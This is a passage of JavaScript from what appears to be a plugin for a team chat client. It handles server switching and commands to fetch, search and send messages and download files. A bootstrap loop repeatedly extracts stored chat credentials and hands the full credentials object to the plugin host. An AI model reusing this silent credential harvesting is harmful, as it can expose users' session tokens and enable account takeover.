                serverUrl: allServers[si].serverUrl || '',
                teamId: allServers[si].teamId || '',
                userName: allServers[si].userName || ''
            });
        }
        plugin.sendData('server_list', { servers: sList, activeIndex: idx });

        return fetchIdentity().then(function(ok) {
            if (!ok) return;
            return fetchTeams().then(function() {
                return fetchUsers();
            }).then(function() {
                return fetchChannels();
            }).then(function() {
                creds.status = 'ready';
                plugin.sendData('credentials', creds);
                plugin.sendData('switch_complete', { serverIndex: idx, serverUrl: creds.serverUrl, teamName: creds.teamName });
            });
        });
    }

    if (action === 'download_file') return downloadFileRaw(cmd.fileId, cmd.fileName);

    if (!credReady || !creds) {
        plugin.sendData('_error', { phase: 'command', error: 'Credentials not ready yet' });
        return;
    }

    if (action === 'fetch_channels') {
        return fetchChannels();
    } else if (action === 'fetch_users') {
        return fetchUsers();
    } else if (action === 'fetch_messages') {
        return fetchMessages(cmd.channelId, cmd.channelName, cmd.limit);
    } else if (action === 'send_message') {
        return sendMessage(cmd.channelId, cmd.text, cmd.channelName);
    } else if (action === 'search_messages') {
        return searchMessages(cmd.query, cmd.count, cmd.page);
    } else if (action === 'refresh_credentials') {
        return extractCredentials().then(function(servers) {
            if (servers && servers.length > 0) {
                allServers = servers;
                creds = allServers[activeServerIndex < servers.length ? activeServerIndex : 0];
                return fetchIdentity();
            }
        });
    }
}

// ===== Bootstrap =====

var retryInterval = (plugin.settings.retryInterval || 15) * 1000;

function tryBootstrap() {
    bootstrapAttempts++;

    extractCredentials().then(function(servers) {
        if (!servers || servers.length === 0) {
            var delay;
            if (bootstrapAttempts <= 3) delay = 3000;
            else if (bootstrapAttempts <= 6) delay = 8000;
            else delay = retryInterval;
            plugin.setTimeout(tryBootstrap, delay);
            return;
        }

        allServers = servers;
        activeServerIndex = 0;
        creds = allServers[0];
        credReady = true;

        // Send server list to UI
        var sList = [];
        for (var s = 0; s < allServers.length; s++) {
            sList.push({
                teamName: allServers[s].teamName || '?',
                serverUrl: allServers[s].serverUrl || '',
                teamId: allServers[s].teamId || '',
                userName: allServers[s].userName || ''
            });
        }
        plugin.sendData('server_list', { servers: sList, activeIndex: 0 });

        // Bootstrap the active server
        fetchIdentity().then(function(ok) {
            if (!ok) {
                credReady = false;
                plugin.setTimeout(tryBootstrap, retryInterval);
                return;
            }
            fetchTeams().then(function() {
                return fetchUsers();
            }).then(function() {
                if (plugin.settings.autoFetchChannels !== 0) {
                    return fetchChannels();
                }
            }).then(function() {
                creds.status = 'ready';
                plugin.sendData('credentials', creds);
            });
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'bootstrap', error: String(e), stack: e.stack || '' });
        plugin.setTimeout(tryBootstrap, retryInterval);
    });
}

plugin.setTimeout(tryBootstrap, 3000);

return {
    cleanup: function() {},
    onCommand: onCommand
};
